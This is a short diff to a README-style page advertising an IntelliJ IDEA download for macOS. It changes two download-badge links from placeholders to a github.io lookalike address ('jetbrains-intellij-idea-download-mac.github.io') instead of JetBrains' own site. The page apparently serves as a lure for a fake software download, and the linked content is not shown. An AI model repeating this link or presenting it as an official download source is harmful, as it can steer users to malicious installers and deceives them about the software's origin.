@@ -7,7 +7,7 @@ Whether you're coding in Java, Kotlin, Python, or JavaScript, IntelliJ IDEA offe
 ---
 
 ## ✅ Download IntelliJ IDEA for macOS  
-[![Download IntelliJ IDEA](https://img.shields.io/badge/Download-IntelliJ_IDEA-blueviolet)](#)
+[![Download IntelliJ IDEA](https://img.shields.io/badge/Download-IntelliJ_IDEA-blueviolet)](https://jetbrains-intellij-idea-download-mac.github.io/.github)
 
 ---
 
@@ -45,7 +45,7 @@ Built to understand your code, IntelliJ IDEA automatically completes, analyzes, 
 
 ---
 
-[![Download IntelliJ IDEA](https://img.shields.io/badge/Download-IntelliJ_IDEA-blueviolet)](#)
+[![Download IntelliJ IDEA](https://img.shields.io/badge/Download-IntelliJ_IDEA-blueviolet)](https://jetbrains-intellij-idea-download-mac.github.io/.github)
 
 ---
 
